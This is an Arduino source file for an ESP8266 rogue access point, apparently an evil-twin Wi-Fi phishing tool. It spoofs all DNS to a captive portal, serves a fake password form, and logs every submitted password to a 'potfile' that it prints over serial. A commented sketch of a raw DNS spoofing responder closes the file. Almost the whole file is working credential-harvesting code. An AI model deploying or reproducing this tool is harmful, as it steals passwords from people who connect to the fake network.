#include "Arduino.h"

#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <LittleFS.h>
#include <ESPAsyncWebServer.h>
const byte DNS_PORT = 53;
const byte STATUS_OK = 200;

IPAddress gateway(192,168,0,1);
IPAddress subnet(255,255,255,0);
AsyncWebServer web(80);

DNSServer dns;

void display_potfile();

String webpage;

void show_form(AsyncWebServerRequest *request) {
  request->send(200, "text/html", webpage);
}

void write_to_potfile(const char* s) {
  File potfile = LittleFS.open("potfile.txt", "a");
  if (!potfile) {
    Serial.println("error: failed to open potfile.txt for writing");
    return;
  }
  potfile.println(s);
  potfile.close();
}

void capture_post(AsyncWebServerRequest *request) {
  if (request->hasParam("password", true)) {
    const AsyncWebParameter *p = request->getParam("password", true);
    const char* password = p->value().c_str();
    Serial.printf("core::capture_post captured %s\n", password);
    write_to_potfile(password);
  }
  show_form(request);
}

void display_potfile() {
  File potfile = LittleFS.open("potfile.txt", "r");
  if (!potfile) {
    Serial.println("warning: failed to open potfile.txt for reading");
    return;
  }
  while (potfile.available()) {
    Serial.write(potfile.read());
  }
  potfile.close();
}

void setup() {
  Serial.begin(115200);
  Serial.println("\r");
  Serial.println("core::setup starting ap");
  
  WiFi.softAPConfig(gateway, gateway, subnet);
  WiFi.softAP("Full_House", "peepeepoopoo");
  if (!LittleFS.begin()){
    Serial.println("error: failed to mount LittleFS");
    return;
  }
  Serial.println("core::setup displaying passwords collected");
  display_potfile();

  File web_file = LittleFS.open("index.html", "r");
  if (!web_file) {
    Serial.println("fatal: failed to open web page for reading");
    return;
  }

  webpage = web_file.readString();
  web_file.close();
  webpage.replace("VENDOR", "peepeepoopoo");
  

  web.on("/", HTTP_GET, show_form);
  web.on("/", HTTP_POST, capture_post);
  web.begin();

  // pretend to be the gateway and every other site in existence
  dns.start(DNS_PORT, "*", gateway);
}

void loop() {
  dns.processNextRequest();
}

// TODO: manual DNS implementation

// s = socket(socket.AF_INET, socket.SOCK_DGRAM)
// s.bind(('0.0.0.0', 53))
// while(true) {
//   data, addr = s.recvfrom(256)
//   response = (
//       data[:2]
//       + b'\x81\x80'
//       + data[4:6] * 2
//       + b'\x00\x00\x00\x00'  // questions and answers counts
//       + data[12:]  // original query
//       + b'\xC0\x0C'  // pointer to domain name above
//       + b'\x00\x01\x00\x01'  // type and class (A record / IN class)
//       + b'\x00\x00\x00\x3C'  // time to live
//       + b'\x00\x04'  // response length (4 bytes = 1 IPv4 address)
//       + bytes([192, 168, 0, 1])
//   )
//   s.sendto(response, addr);
// }
